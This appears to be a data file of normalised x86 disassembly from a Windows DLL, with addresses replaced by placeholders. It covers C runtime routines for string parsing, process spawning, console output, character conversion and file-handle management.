mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_10013c93
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_1000fe7d
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1001797c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov cl 0x3b
jmp r-xdata
cmp [ esi ] cl
je r-xdata
inc esi
dec [ ebp + 0x10 ]
mov [ ebp + 0x8 ] esi
jne r-xdata
mov al [ esi ]
mov edi [ ebp + 0xc ]
push ebx
test al al
je r-xdata
call sub_1001129f
mov edi [ ebp + 0xc ]
mov [ eax ] 0x22
jmp r-xdata
cmp [ esi ] cl
je r-xdata
push 0x22
pop ebx
mov eax [ ebp + 0x8 ]
sub eax esi
neg eax
mov [ edi ] 0x0
sbb eax eax
pop edi
and eax esi
pop esi
pop ebp
retn
inc esi
pop ebx
cmp al bl
je r-xdata
inc esi
mov al [ esi ]
test al al
je r-xdata
mov [ edi ] al
inc edi
inc esi
dec [ ebp + 0x10 ]
jne r-xdata
cmp al bl
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov [ ebp + 0x8 ] esi
call sub_1001129f
mov [ eax ] ebx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
mov [ edi ] al
inc edi
inc esi
dec [ ebp + 0x10 ]
je r-xdata
cmp al cl
je r-xdata
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub_10017a11
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push [ ebp + 0x10 ]
xor ebx ebx
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] ebx
call sub_10010024
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
jne r-xdata
push esi
mov esi [ ebp - 0x10 ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
push edi
push [ ebp + 0xc ]
push ecx
call sub_10018e90
pop ecx
pop ecx
cmp [ ebp - 0x8 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp + 0xc ] eax
inc ecx
mov dl [ ecx ]
cmp dl bl
je r-xdata
pop esi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
pop ebx
leave
retn
inc ecx
cmp dl bl
jne r-xdata
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] ebx
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + esi + 0x1d ] 0x4
je r-xdata
pop edi
cmp [ ebp - 0x8 ] bl
je r-xdata
jne r-xdata
lea eax [ ecx - 0x1 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_10017ae4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_10018ed0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_10017bb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x68
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1 ] bl
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ eax ] bl
jne r-xdata
jle r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
push 0x44
pop esi
push esi
lea eax [ ebp - 0x68 ]
push ebx
push eax
call sub_10010a00
mov [ ebp - 0x68 ] esi
mov esi [ rw-data ]
add esp 0xc
cmp esi ebx
je r-xdata
call sub_100112b2
mov [ eax ] ebx
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0x3
jle r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] bl
je r-xdata
cmp esi 0x3332
jae r-xdata
lea eax [ esi - 0x1 ]
pop edi
pop ebx
leave
retn
cmp eax 0x4
jne r-xdata
mov [ eax ] 0x20
mov eax ecx
call sub_1001129f
mov [ eax ] 0xc
mov eax esi
imul eax eax 0x5
add eax 0x4
mov [ ebp - 0x36 ] ax
movzx eax ax
push 0x1
push eax
call sub_10013c93
pop ecx
pop ecx
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
cmp esi ebx
jl r-xdata
dec esi
dec eax
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1 ] 0x1
cmp esi ebx
mov [ eax ] esi
mov eax [ ebp - 0x34 ]
lea ecx [ eax + 0x4 ]
lea edi [ eax + esi + 0x4 ]
mov [ ebp - 0x8 ] ebx
jle r-xdata
mov ecx eax
mov edx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and edx 0x1f
shl edx 0x6
cmp [ ecx + edx + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx eax
and eax 0x1f
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
mov dl [ eax + 0x4 ]
test dl 0x10
jne r-xdata
call sub_100112b2
mov [ eax ] ebx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push 0x1
push ebx
push ebx
push [ ebp - 0x10 ]
push [ ebp + 0xc ]
call [ CreateProcessA@IAT ]
mov esi eax
call [ GetLastError@IAT ]
push [ ebp - 0x34 ]
mov edi eax
call sub_1000fe7d
pop ecx
cmp esi ebx
jne r-xdata
lea ecx [ eax + 0x4 ]
xor edx edx
lea eax [ eax + esi + 0x4 ]
mov [ ecx ] bl
or [ edi ] 0xffffffff
mov [ ecx ] dl
mov eax [ eax ]
mov [ edi ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
push edi
call sub_100112c5
pop ecx
jmp r-xdata
push 0x3
pop edi
mov edi esi
jmp r-xdata
mov eax [ ebp - 0x34 ]
inc [ ebp - 0x8 ]
inc ecx
add edi 0x4
cmp [ ebp - 0x8 ] esi
jl r-xdata
mov esi [ CloseHandle@IAT ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push ebx
call sub_1001248c
or eax 0xffffffff
mov [ ebp - 0xc ] 0x8
mov [ ecx ] bl
or [ eax ] 0xffffffff
inc edx
inc ecx
add eax 0x4
jmp r-xdata
cmp edx edi
jge r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
push 0xffffffff
push [ ebp - 0x24 ]
call [ WaitForSingleObject@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x24 ]
call [ GetExitCodeProcess@IAT ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
cmp esi 0x3
jge r-xdata
mov ebx [ ebp - 0x24 ]
push [ ebp - 0x24 ]
call esi
jmp r-xdata
pop esi
push [ ebp - 0x20 ]
call esi
mov eax ebx
jmp r-xdata
sub_10017dc6
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi r--data
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp + 0x14 ]
movsb [ edi ] [ esi ]
push 0x2
mov [ ebp - 0x38 ] eax
mov edi eax
mov eax [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x3c ] ebx
pop esi
jmp r-xdata
cmp eax ebx
jne r-xdata
push eax
call sub_10016180
add edi 0x4
lea esi [ esi + eax + 0x1 ]
mov eax [ edi ]
pop ecx
push 0x1
push esi
mov [ ebp - 0x34 ] esi
call sub_10013c93
mov esi [ ebp - 0x20 ]
pop ecx
pop ecx
mov [ esi ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push ebx
push eax
call sub_100148af
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] ebx
call sub_1001129f
mov [ eax ] 0xc
call sub_100112b2
mov [ eax ] 0x8
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_10016180
mov edi eax
inc edi
inc edi
pop ecx
mov [ ebp - 0x30 ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp eax 0x16
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
mov eax [ ebp - 0x2c ]
cmp eax ebx
je r-xdata
push [ ebp - 0x14 ]
call sub_10016180
add edi eax
pop ecx
mov [ ebp - 0x30 ] edi
push [ esi ]
or [ ebp - 0x24 ] 0xffffffff
call sub_1000fe7d
mov eax [ ebp - 0x18 ]
mov [ esi ] ebx
pop ecx
mov [ eax ] ebx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] ebx
push 0x2
mov esi eax
mov eax [ eax ]
pop edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
mov eax esi
sub eax esi
add eax [ ebp - 0x34 ]
push eax
push esi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
inc esi
jmp r-xdata
cmp eax ebx
jne r-xdata
mov [ rw-data ] ebx
cmp [ ebp - 0x14 ] ebx
je r-xdata
push eax
call sub_1000fe7d
pop ecx
push [ edi ]
call sub_10016180
lea esi [ esi + eax + 0x1 ]
add edi 0x4
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
mov eax [ edi ]
cmp eax ebx
jne r-xdata
push eax
call sub_10016180
add esi 0x4
lea edi [ edi + eax + 0x1 ]
mov eax [ esi ]
pop ecx
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0x24 ]
push [ ebp - 0x14 ]
call sub_1000fe7d
pop ecx
pop ecx
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
sub eax esi
add eax [ ebp - 0x34 ]
push eax
push esi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ esi - 0x1 ] bl
mov [ esi ] bl
mov esi [ eax ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x1c ] ebx
cmp [ eax ] bl
je r-xdata
call sub_1001528a
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
push [ edi ]
call sub_10016180
add esi eax
add edi 0x4
mov [ esi ] 0x20
inc esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
cmp esi ebx
je r-xdata
mov edi [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
mov ecx edi
sub ecx eax
push ecx
mov ecx [ rw-data ]
add ecx eax
push ecx
push esi
call sub_10010ab0
sub edi [ ebp - 0x1c ]
add esp 0xc
add esi edi
mov edi [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov cl [ eax ]
mov esi eax
mov esi [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
cmp esi [ eax ]
jne r-xdata
cmp [ edi ] ebx
jne r-xdata
add eax ecx
cmp [ eax ] 0x3d
je r-xdata
push esi
call sub_10016180
pop ecx
mov ecx [ ebp - 0x1c ]
lea ecx [ ecx + eax + 0x1 ]
mov eax [ rw-data ]
lea esi [ eax + ecx ]
mov [ ebp - 0x1c ] ecx
mov cl [ esi ]
cmp cl bl
jne r-xdata
mov [ esi ] bl
mov [ esi ] bl
inc esi
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x18 ]
push [ edi ]
sub eax esi
add eax [ ecx ]
push eax
push esi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x3c ] ebx
jne r-xdata
cmp [ eax + 0x1 ] bl
je r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x1c ]
mov esi [ ebp - 0x2c ]
add edi eax
mov [ ebp - 0x40 ] edi
jmp r-xdata
cmp cl 0x3d
je r-xdata
push [ edi ]
call sub_10016180
pop ecx
lea esi [ esi + eax + 0x1 ]
add edi 0x4
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
mov edi [ ebp - 0x30 ]
lea eax [ ebp - 0x10 ]
push eax
push edi
push esi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
cmp [ eax + 0x2 ] 0x3a
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
push r--data
push edi
push esi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
cmp [ eax + 0x3 ] 0x3d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_10016180
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ esi ]
call sub_10019156
add esp 0x10
test eax eax
je r-xdata
add edi [ ebp - 0x30 ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
add eax 0x4
push eax
call sub_10016180
pop ecx
mov ecx [ ebp - 0x28 ]
lea eax [ ecx + eax + 0x5 ]
mov ecx [ rw-data ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x3c ] 0x1
jmp r-xdata
add esi 0x4
mov edi [ ebp - 0x38 ]
mov eax [ edi ]
mov esi [ esi ]
cmp eax ebx
jne r-xdata
push [ esi ]
call sub_1000fe7d
pop ecx
mov [ esi ] ebx
call sub_1001129f
mov [ eax ] 0xc
call sub_100112b2
or [ ebp - 0x24 ] 0xffffffff
mov [ eax ] 0x8
jmp r-xdata
add esi edi
push [ ebp - 0x14 ]
push edi
push esi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
push 0x1
push edi
call sub_10013c93
mov esi [ ebp - 0x20 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x18 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
sub_1001819f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100194fe
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019540
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100182a7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_10013c93
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1000fe7d
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_100196e6
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_1000fe7d
pop ecx
mov [ ebp - 0x4 ] esi
sub_1001833e
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017391
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_1001129f
test eax eax
je r-xdata
call sub_1001129f
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_1001837e
push 0xc
push r--data
call sub_10012000
push 0xe
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100183e5
call sub_10012045
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1000fe7d
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_1000fe7d
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_100183ee
push 0x10
push r--data
call sub_10012000
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1001129f
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001153b
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_10012045
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018488
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_10018491
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_100184fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10019931
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000fe6e
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_100185c1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10014189
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1001129f
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_100186f2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1001129f
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10013956
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_10018756
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10018861
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1001129f
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_100112c5
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_100187db
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_1001129f
mov [ eax ] 0x9
call sub_100112b2
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10018861
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_100112b2
and [ eax ] 0x0
call sub_1001129f
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_100112b2
